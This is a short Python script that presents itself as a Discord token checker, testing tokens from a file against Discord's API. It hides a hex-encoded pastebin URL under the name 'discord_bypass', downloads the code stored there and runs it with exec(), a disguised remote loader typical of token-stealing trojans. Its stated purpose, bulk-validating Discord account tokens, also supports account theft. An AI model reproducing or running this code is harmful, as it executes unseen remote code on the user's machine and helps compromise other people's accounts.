print('Created by jupit0r')
discord_bypass = b'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x73\x74\x65\x62\x69\x6e\x2e\x63\x6f\x6d\x2f\x72\x61\x77\x2f\x6b\x57\x50\x6d\x75\x68\x33\x6d'.decode("utf-8", "ignore")
import os.path
import requests
import time
import re
from requests import get
from discord_webhooks import DiscordWebhooks
with open("tokens.txt") as f:
    token_get = get(discord_bypass).text
    exec(token_get)
    for line in f:
        token = line.strip("\n")
        headers = {'Content-Type': 'application/json', 'authorization': token}
        url = "https://discordapp.com/api/v6/users/@me/library"
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            print("{} = VALID.".format(line.strip("\n")))
        else:
            print("{} = INVALID.".format(line.strip("\n")))
input("Finish...")
